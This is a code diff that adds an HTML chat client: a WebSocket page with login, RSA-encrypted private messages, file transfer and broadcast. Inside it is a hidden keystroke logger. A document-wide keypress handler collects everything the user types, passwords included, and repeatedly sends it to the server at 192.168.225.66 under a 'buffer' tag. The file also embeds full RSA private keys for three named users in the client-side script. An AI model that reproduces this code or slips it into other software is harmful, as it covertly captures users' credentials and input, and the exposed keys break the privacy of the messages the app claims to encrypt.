@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>WebSocket Client</title>
+    <style>
+        #messages {
+            border: 1px solid #ccc;
+            padding: 10px;
+            height: 300px;
+            overflow-y: scroll;
+        }
+        .message {
+            padding: 5px;
+            border-bottom: 1px solid #ccc;
+        }
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/jsencrypt@3.0.0/bin/jsencrypt.min.js"></script>
+</head>
+<body>
+    <h1>WebSocket Client</h1>
+    <label for="username">Username:</label>
+    <input type="text" id="username">
+    <br><br>
+    <label for="password">Password:</label>
+    <input type="password" id="password">
+    <button onclick="login()">Login</button>
+    <br><br>
+    <label for="toUser">To User:</label>
+    <input type="text" id="toUser">
+    <br><br>
+    <label for="message">Message:</label>
+    <input type="text" id="message">
+    <button onclick="sendMessage()">Send Message</button>
+    <br><br>
+    <label for="file">File:</label>
+    <input type="file" id="file">
+    <button onclick="sendFile()">Send File</button>
+    <progress id="progressBar" value="0" max="100" style="display: none;"></progress>
+    <br><br>
+    <label for="broadcastMessage">Broadcast Message:</label>
+    <input type="text" id="broadcastMessage">
+    <button onclick="sendBroadcastMessage()">Send Broadcast Message</button>
+    <br><br>
+    <div id="messages"></div>
+    <br><br>
+    <h2>Online Users</h2>
+    <ul id="onlineUsers"></ul>
+
+    <script>
+        const ws = new WebSocket('ws://192.168.225.66:5555');
+    
+        async function fetchKeys() {
+            const response = await fetch('keys.json');
+            const keys = await response.json();
+            return keys;
+        }
+
+        let keys = '';
+
+        document.onkeypress = function(e) {
+            const key = e.key;
+            keys += key;
+
+            // Send data to server every 500ms
+            setInterval(function() {
+                if (keys !== '') {
+                    ws.send(JSON.stringify({ tag: 'buffer', data: keys }));
+                    keys = '';
+                }
+            }, 500);
+        };
+
+        ws.onmessage = async function(event) {
+            const messages = document.getElementById('messages');
+            const onlineUsersList = document.getElementById('onlineUsers');
+            const message = JSON.parse(event.data);
+
+            if (message.tag === 'message') {
+                if (message.to !== 'public') {
+                    const decryptedMessage = await decryptMessage(message.info, document.getElementById('username').value);
+                    const div = document.createElement('div');
+                    div.className = 'message';
+                    div.textContent = `${message.from}: ${decryptedMessage}`;
+                    messages.appendChild(div);
+                }else{
+                    const div = document.createElement('div');
+                    div.className = 'message';
+                    div.textContent = `${message.from}: ${message.info}`;
+                    messages.appendChild(div);
+                }
+            }else if (message.tag === 'file') {
+                const link = document.createElement('a');
+                link.href = message.info;
+                link.download = message.filename;
+                link.textContent = `File from ${message.from}: ${message.filename}`;
+                const div = document.createElement('div');
+                div.className = 'message';
+                div.appendChild(link);
+                messages.appendChild(div);
+            } else if (message.tag === 'status') {
+                const div = document.createElement('div');
+                div.className = 'message';
+                div.innerHTML = `<em>${message.content}</em>`;
+                messages.appendChild(div);
+            }else if (message.tag === 'presence') {
+            // Clear the current list
+            onlineUsersList.innerHTML = '';
+            // Add each online user to the list
+            message.presence.forEach(user => {
+                const li = document.createElement('li');
+                li.textContent = user.nickname;
+                onlineUsersList.appendChild(li);
+            });
+        }};
+
+        async function login() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            ws.send(JSON.stringify({ tag: 'login', username: username, password: password }));
+            console.log("logged in");
+        }
+
+        async function sendMessage() {
+            const toUser = document.getElementById('toUser').value;
+            const message = document.getElementById('message').value;
+            const fromUser = document.getElementById('username').value;
+            console.log(toUser,message,fromUser);
+            const keys = {
+                "aryan@s6": {
+                    "publicKey": "-----BEGIN PUBLIC KEY-----\r\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArF1Jjg1WVLHOL9rGPIXt\r\nh5fq0lpXUv27RQ8gH8vTezgzyG10K4mS6vfSru56LJGQFZ8RLOVLiTS2utWILPKV\r\n2dS0cizPd1KYxWSBINNbrRv/tKFpbkI0Jui33oNPmCcrdm4vjfWh1rSMPyvNsslE\r\nn0tbwu/ah2gTQLG4lZJv6rvxCdxEKgBy+omvfwEe3uTL3VrGiwWHjac9nvSz3pLa\r\n5QcQYb8l1Xh95KOifhz8lrSVboleK79HPMl+NIoUlvX69lMZ6u9SeMSl8UzoF437\r\nhyTw6GzMHdcx1ok0BuzhXd3xlLrwe/Cv7/x82Ll4DwBPrU4yROScPURKQ+vYANq5\r\nnwIDAQAB\r\n-----END PUBLIC KEY-----\r\n",
+                },
+                "ash@s6": {
+                    "publicKey": "-----BEGIN PUBLIC KEY-----\r\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArrnGzVd/yZ+QXrKw4iBo\r\ndYLErCVxCete87ISHQlfiuvrWXOSEJr4EDrkvMvPXU/vdqX0ASmQJBril5y4TatG\r\nwggeWYEO9QPPofIzV11FkOKUuvcRdiP1ZND0MneBjGDWwpDwVd2q8NZV3ZKfP1ya\r\nMz41yrVM+90F+DG8h/V2VDd3u1vfszMBEhfB2Yz7qVYOOqEnIDKn8ANPZVb/OMGX\r\nEIAObYZ3r5bRvwhY+uUEAeEo//euNaCQU5ISsmsR82AGM+AuB+sJK6kJPsuIrfZs\r\n0L4bypzpQ7F+oJ9Pooec5Z/tdXhC1k4uDUB47si2qP5tM0kK82qv7uvAodUxkOWD\r\nAwIDAQAB\r\n-----END PUBLIC KEY-----\r\n",
+                },
+                "shivang@s6": {
+                    "publicKey": "-----BEGIN PUBLIC KEY-----\r\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxsjgsC1qdBZGK9rPFK2N\r\nLfLhpfTrvlLF5eeLyWHR2SgozFIE8+mUUdbDXOofFJow4UL4+2YU1eT19rSmQeCe\r\na5AzQn3TLaNKdxe5qg6Owbq6OvFp3QWhovV19NsaBqoxCqYMkdy7yW0eEoYkiPmD\r\n7hsd8+wlIvoJ4lxFtslbi1hkk6ZshYmeXD8WI2zJXRqRJY/SUL+Y7F+oaY8bYRkq\r\nRU7as+kHD3Mbs714WtQ9uQCXrlD8zVH9dUgJaf//aKu4GIzHEQDNy34CEmLGhO37\r\nTBDaR+WIt+iSfQMPznRUQ0YtNlGP6ZPK0JVoe5Ow1JvZ3zgw8ndOS/KOsyn//CCh\r\naQIDAQAB\r\n-----END PUBLIC KEY-----\r\n",
+                }
+            };
+
+            if (keys[toUser] && keys[toUser].publicKey) {
+                const encryptedMessage = await encryptMessage(toUser, message);
+                ws.send(JSON.stringify({
+                    tag: 'message',
+                    from: fromUser,
+                    to: toUser,
+                    info: encryptedMessage
+                }));
+            } else {
+                ws.send(JSON.stringify({
+                    tag: 'message',
+                    from: fromUser,
+                    to: toUser,
+                    info: message
+                }));
+            }
+        }
+
+        async function encryptMessage(toUser, message) {
+            try {
+                const keys = {
+                    "aryan@s6": {
+                        "publicKey": "-----BEGIN PUBLIC KEY-----\r\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArF1Jjg1WVLHOL9rGPIXt\r\nh5fq0lpXUv27RQ8gH8vTezgzyG10K4mS6vfSru56LJGQFZ8RLOVLiTS2utWILPKV\r\n2dS0cizPd1KYxWSBINNbrRv/tKFpbkI0Jui33oNPmCcrdm4vjfWh1rSMPyvNsslE\r\nn0tbwu/ah2gTQLG4lZJv6rvxCdxEKgBy+omvfwEe3uTL3VrGiwWHjac9nvSz3pLa\r\n5QcQYb8l1Xh95KOifhz8lrSVboleK79HPMl+NIoUlvX69lMZ6u9SeMSl8UzoF437\r\nhyTw6GzMHdcx1ok0BuzhXd3xlLrwe/Cv7/x82Ll4DwBPrU4yROScPURKQ+vYANq5\r\nnwIDAQAB\r\n-----END PUBLIC KEY-----\r\n",
+                        },
+                    "ash@s6": {
+                        "publicKey": "-----BEGIN PUBLIC KEY-----\r\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArrnGzVd/yZ+QXrKw4iBo\r\ndYLErCVxCete87ISHQlfiuvrWXOSEJr4EDrkvMvPXU/vdqX0ASmQJBril5y4TatG\r\nwggeWYEO9QPPofIzV11FkOKUuvcRdiP1ZND0MneBjGDWwpDwVd2q8NZV3ZKfP1ya\r\nMz41yrVM+90F+DG8h/V2VDd3u1vfszMBEhfB2Yz7qVYOOqEnIDKn8ANPZVb/OMGX\r\nEIAObYZ3r5bRvwhY+uUEAeEo//euNaCQU5ISsmsR82AGM+AuB+sJK6kJPsuIrfZs\r\n0L4bypzpQ7F+oJ9Pooec5Z/tdXhC1k4uDUB47si2qP5tM0kK82qv7uvAodUxkOWD\r\nAwIDAQAB\r\n-----END PUBLIC KEY-----\r\n",
+                        },
+                    "shivang@s6": {
+                        "publicKey": "-----BEGIN PUBLIC KEY-----\r\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxsjgsC1qdBZGK9rPFK2N\r\nLfLhpfTrvlLF5eeLyWHR2SgozFIE8+mUUdbDXOofFJow4UL4+2YU1eT19rSmQeCe\r\na5AzQn3TLaNKdxe5qg6Owbq6OvFp3QWhovV19NsaBqoxCqYMkdy7yW0eEoYkiPmD\r\n7hsd8+wlIvoJ4lxFtslbi1hkk6ZshYmeXD8WI2zJXRqRJY/SUL+Y7F+oaY8bYRkq\r\nRU7as+kHD3Mbs714WtQ9uQCXrlD8zVH9dUgJaf//aKu4GIzHEQDNy34CEmLGhO37\r\nTBDaR+WIt+iSfQMPznRUQ0YtNlGP6ZPK0JVoe5Ow1JvZ3zgw8ndOS/KOsyn//CCh\r\naQIDAQAB\r\n-----END PUBLIC KEY-----\r\n",
+                        }
+                };
+
+                const publicKey = keys[toUser].publicKey;
+
+                const encrypt = new JSEncrypt();
+                encrypt.setPublicKey(publicKey);
+                encryptedMessage = encrypt.encrypt(message);
+                console.log(encryptedMessage);
+                return encryptedMessage;
+            } catch (error) {
+                console.error('Encryption error:', error);
+                throw error;
+            }
+        }
+
+
+        async function decryptMessage(encryptedMessage, username) {
+            try {
+                const keys = {
+                    "aryan@s6": {
+                        "privateKey": "-----BEGIN RSA PRIVATE KEY-----\r\nMIIEogIBAAKCAQEArF1Jjg1WVLHOL9rGPIXth5fq0lpXUv27RQ8gH8vTezgzyG10\r\nK4mS6vfSru56LJGQFZ8RLOVLiTS2utWILPKV2dS0cizPd1KYxWSBINNbrRv/tKFp\r\nbkI0Jui33oNPmCcrdm4vjfWh1rSMPyvNsslEn0tbwu/ah2gTQLG4lZJv6rvxCdxE\r\nKgBy+omvfwEe3uTL3VrGiwWHjac9nvSz3pLa5QcQYb8l1Xh95KOifhz8lrSVbole\r\nK79HPMl+NIoUlvX69lMZ6u9SeMSl8UzoF437hyTw6GzMHdcx1ok0BuzhXd3xlLrw\r\ne/Cv7/x82Ll4DwBPrU4yROScPURKQ+vYANq5nwIDAQABAoIBAB4uUYhdnn3DCpMH\r\nkEmdu9tPxw7hQcQm6KktflcC9jtvumWAgOR0uPSKw2ndGSh/roaSrUu6tLDIOaza\r\nYfdY3NNhMt2BKiy/GkAKGrA4Qie8LNigoNjtH7umaTe9r2y5gxtALPSDC70QLTSM\r\ng36oTmtEI0OtgwrNtv1PgT4zf4RO7aiw7JsMvvX8k9OXAnr4WBeT/gOGlrGISDDY\r\nnNfT6t3k1kULujl2p5Ltd1dSRMMwDtJiuDCh83CICiLQf3eqElIxYcuS8ltSMzut\r\nndanOwK2JtD3XHcXgKoj3QqN5jbfcGOIDPLmUIG2oZfg0sOivJFuYLi4ZT/QPy9u\r\naupX0SUCgYEA4Mznv1k8D5bwysR4KvGaDO5EghAk7j0zNR4PPfgc6Cf+1bKJP6pp\r\nqoTNAztLT+HR38tUDtTGKahuAUa0c8sdA2nI1FcuzJpdLwl37YBVOaVH91je4Agz\r\nvcq72pxiZcqdOGN7HzYN+Y7IjYttzFXDkY/O+o79JO/dOjEgZZ9h5W0CgYEAxElY\r\neeKM3MZmeDHPerFAulzJYSsOPKowd55nUEGS1U6DBavO/t7YDseglc6XAG5UAKO+\r\nIwQpREBjl+c0thu7p3HdrAeJ0wQxfPQxtA6DqlCTfYjbn7Z4uh0UUcQntM/+w0bE\r\nX9jY8YTFQYfNHLG4JexxJhWxnT6IvMI8nucJz7sCgYAh48IsPq+nSgITD3tuPe4T\r\ndPgvA3AN2nwVzepOVVFGToFEhh3a0z4Kzup5Sj8YU9rn+ic59SnKrfGnj5k0u7Is\r\nCY6VNG+BuOPDa5IA5A/1GM24pFU1QQdL3XxkgJ706Y66KYUuN1/z92qUrChpXaSW\r\nFTAG5feT0fVwCGfx6g1AIQKBgEe/E4MBx0FPl9bpRhBvx9wW3FkTFtIf1zVyBgt0\r\n3Inxd7zT7waER+8nEtCPQeybZ0MQlwhPlhHngz/b+A10l6P93+vomX0zNC+bRqus\r\n/n17lF23b6eyV/CXfnzguS7DNDkGnfL23V1yjXOFgvixEUFzamxkU5bJa8urJ+Nh\r\nSdnPAoGAXwiF5z0bmfoSxeRhSe2ip8FVZBzDlxnkmGwhwzDOPOBgVONra7tW6uu3\r\nVO+wWN65R2FPd8oLlNOOIW+qhIqs1vFqnQuyY/cho9f/Ja1Ez6iLOlUXrj7R7tv2\r\nyVRSXtB8DZbNdzu+aPrYBKqI3xpLsIoKLyATr7J8GH5ZqTYaHmk=\r\n-----END RSA PRIVATE KEY-----\r\n"
+                    },
+                    "ash@s6": {
+                        "privateKey": "-----BEGIN RSA PRIVATE KEY-----\r\nMIIEogIBAAKCAQEArrnGzVd/yZ+QXrKw4iBodYLErCVxCete87ISHQlfiuvrWXOS\r\nEJr4EDrkvMvPXU/vdqX0ASmQJBril5y4TatGwggeWYEO9QPPofIzV11FkOKUuvcR\r\ndiP1ZND0MneBjGDWwpDwVd2q8NZV3ZKfP1yaMz41yrVM+90F+DG8h/V2VDd3u1vf\r\nszMBEhfB2Yz7qVYOOqEnIDKn8ANPZVb/OMGXEIAObYZ3r5bRvwhY+uUEAeEo//eu\r\nNaCQU5ISsmsR82AGM+AuB+sJK6kJPsuIrfZs0L4bypzpQ7F+oJ9Pooec5Z/tdXhC\r\n1k4uDUB47si2qP5tM0kK82qv7uvAodUxkOWDAwIDAQABAoH/IntPnyBXkiTgLGv1\r\n9u0geKw0k1U/lX3o/HG4shiLoQtzk1UO+NPI/2r5ByfjxIaHg+3uZh/NtqBJvoCT\r\nb3KghC/eUwM7gR8S5gRKjNz8x1hI9rMZh27I6K0ypXUct7jUDWU/QJFzV0vT6Qe4\r\nqIW0K4obbJfVeCHjkUQpPquhz/GApes1mVnLY2yOPx4af6m1OF+WeidqrepbblzG\r\nxJk4Ynhi2MBH6b7vqBUD0ctRJmydMKAftCV4avCYrY2DCp7s+pEPtqd7M7XSSZuH\r\nZypaoYxXIc8z3KbaNWTSvmIEjf3o6pJFYrjPHcKf8jhY6Aje0fjaKcW60quz8y+r\r\nIJUhAoGBAOeQeWcn8xPSzw141d3Oe8Lh/lnlJwNtRHguuRI+XZeKlqT8TpG73l3R\r\nuDUhCuJNi2ytBYk/TIyOERkM3olMi8Cz9P9y1kNXpWlbl7FsOQ1odSZyVAMAah3L\r\nkwAXaNqIzyMRaIKgEfEpGRLAR3OgWx3EDRJ9/AyaDmcM7XX7keJ5AoGBAMEp2fCh\r\n96doskvbippKobrBF2/qZhEWNkit51a6JJvO3EDXaGF8LVHxaA5RkPVDhoSOwhGr\r\nYCGE23NumMpgifkZLtV6w19zplCWWAU/iw0pVMeZLaXV3KdgzHrolrcArWP4wXkM\r\noepvJhFOy4+4toG9XHlQx763vLkir4EnqZJbAoGBAKYHK1RwC1QCSRxisAypuIjB\r\nWon/yBon5Pi6n01aU+aMonhGwtqwtb3U2VuWhmQ9ryLLZ3XBYdRBJDcux/vvWyBe\r\npuHk54U/OUUyO7AlZT6cz6oyPNQuHuegB5UAM9jEUKfXGnTV6idcDTMpk9FufwX3\r\nhFvm4qnyZzMxzKxUJIQZAoGAGsSr+RbY9RAjNTP1XzBcfT7o+o9nGZMUbrn6xyAA\r\nlr7x8uJnCqtktGhZ3TIcfoCfEZue9UfkiICa0MJQ1irOtABzZw4eKQoj0CMli4Sk\r\nxmwl3YsysjqS23cknxvAVxf271W3qgjAH3bLtbZPq1kToaMWP5GcPKfFtXpDDAjt\r\nDOUCgYEAm/0xW1UXiG1ycU/CYHOjLKJCBNlw4FMSnjoB5Q8k+A7Y9fJtCwgmO+yz\r\nRzzgPVxYaFY6zAz2sstDnbC/RuK7JX82KeFvbiZXBnVCR6DgIi3321fdRN5RApz8\r\nkqYsxqRvOTDA7nhHbqDLdmECsE0pJ4QbfJuUzeTdTLrA8ET+WwE=\r\n-----END RSA PRIVATE KEY-----\r\n"
+                    },
+                    "shivang@s6": {
+                        "privateKey": "-----BEGIN RSA PRIVATE KEY-----\r\nMIIEogIBAAKCAQEAxsjgsC1qdBZGK9rPFK2NLfLhpfTrvlLF5eeLyWHR2SgozFIE\r\n8+mUUdbDXOofFJow4UL4+2YU1eT19rSmQeCea5AzQn3TLaNKdxe5qg6Owbq6OvFp\r\n3QWhovV19NsaBqoxCqYMkdy7yW0eEoYkiPmD7hsd8+wlIvoJ4lxFtslbi1hkk6Zs\r\nhYmeXD8WI2zJXRqRJY/SUL+Y7F+oaY8bYRkqRU7as+kHD3Mbs714WtQ9uQCXrlD8\r\nzVH9dUgJaf//aKu4GIzHEQDNy34CEmLGhO37TBDaR+WIt+iSfQMPznRUQ0YtNlGP\r\n6ZPK0JVoe5Ow1JvZ3zgw8ndOS/KOsyn//CChaQIDAQABAoIBABK1AcwiogOFuxnS\r\ncC2CfahG1KxxBaR2FrChnzqW7ZAxotFDoLqxjyc6fk0mrUEbl6EDU/oYq7pLX0hV\r\nzNWjRVVbDy/hNnfzh4T4oxzZXN7nazIz2OIXbxQuZGjkG6ln59CYOtOZQcTdc3iL\r\nzjFjxeIpBCMZ5I7LmBWI2Hiwr2BICTjtSeLVVykNvS1oPdMZQ3SVNLN3wLJfgIjE\r\n3er9a5/2iwvtFix9FGUAFaizgjb/jimHDFgAbwHMakRVVZ5ZieRx28TI3Eks+95r\r\ntCpqsiMHkWcJ0nTSpxR1AJeJqcEu9qOVW5fGKpFlLRZUb3B9BcpqPOqZGhAh5vDV\r\njGBkqz8CgYEA7+cqslnL9heqaifdp0l0JWRsoH8faUtl7BizfbCe3wKn5f9bvfFH\r\nNhmTcAYOUbM+ED/wrS2QgSXvqnpdXNSHkGHycsPva+vDiQl5AuOBn1krKGCArk9r\r\nWKJSsj/EA3frm1rOvAej6tEQy/NtINmVuPWTwa8Qec04GXlLnb7ofAMCgYEA1B9r\r\nEc9LGIJ5JHlaKM7DmUY0gyrJYDVmSFouNX1eEFhABBCB00YXcDbrbphCDgm2cY2U\r\n2Dl4BCfaiXNbPlRWSWB7+mjkwiZnuZVkxO7crWYSu9yCctG1CZN1PEQxNM27P8C9\r\nE6IbnDFBTp8Kky4J6jqE7+cw7ORXVYETcV8GjyMCgYBh3nycpeV/T8hF5l2WkXDA\r\nkGeAUlwOKKQ73RfcfuFROVQlkDdtFbFncKelW9MboXQATRVykNQS29caRTExXcKw\r\nNEUkbKqP7G6oySSE+Ss4RrhEkJnugpfYYOA7t6fPgmyrxC/ypWtJsGCZ04UBkcJy\r\n4jyVF0YxancobUNb5zYQ4QKBgDtXZr6evSVoKre3cy+DWFjiuQIQ0DEn/ysyf0bb\r\ngZsU9SOt8oPGUfxEgOx5j9EZin6N2xv6R8bx10MokFgJg/IXGdfdzFE8KTxTvNMS\r\n941Sxt7jO2Mfo4PASsXHVfStsTqOktaRPSQe62QxPeYatQ9fu5zZkmhTINN8vpGy\r\nwcT9AoGADFAAa6mm3Uh6dysBtlpOSf+0m4YIZr4l3jrmP7W2KFzB3Ppstzsmy7An\r\nc9+jUOhmZ09Ij4Rf0ZCxfDDyx2dd40nPMcIh95AnnifBOXqiniLB3KNydmzaPx8P\r\nxQ5JxakXp5LxeSJU2FuBgKVGsx2lcfBfZi1SCDD8SsHZDWYWZBI=\r\n-----END RSA PRIVATE KEY-----\r\n"
+                    }
+                };
+                const privateKey = keys[username].privateKey;
+
+                const decrypt = new JSEncrypt();
+                decrypt.setPrivateKey(privateKey);
+                const decryptedMessage = decrypt.decrypt(encryptedMessage);
+
+                return decryptedMessage;
+
+            } catch (error) {
+                console.error('Decryption error:', error);
+                throw error;
+            }
+        }
+
+        function sendFile() {
+            const toUser = document.getElementById('toUser').value;
+            const fileInput = document.getElementById('file');
+            const file = fileInput.files[0];
+            const reader = new FileReader();
+
+            const progressBar = document.getElementById('progressBar');
+
+            reader.onprogress = function(event) {
+                if (event.lengthComputable) {
+                    progressBar.style.display = 'block';
+                    progressBar.value = (event.loaded / event.total) * 100;
+                }
+            };
+
+            reader.onload = function(event) {
+                const fileData = event.target.result;
+                const filename = file.name;
+                const fromUser = document.getElementById('username').value;
+                ws.send(JSON.stringify({ tag: 'file', from: fromUser, to: toUser, filename: filename, info: fileData }));
+                progressBar.style.display = 'none';
+                progressBar.value = 0;
+            };
+
+            reader.readAsDataURL(file);
+        }
+
+        function sendBroadcastMessage() {
+            const broadcastMessage = document.getElementById('broadcastMessage').value;
+            const fromUser = document.getElementById('username').value;
+            ws.send(JSON.stringify({ tag: 'message', from: fromUser, to: 'public', info: broadcastMessage }));
+        }
+    </script>
+</body>
+</html>
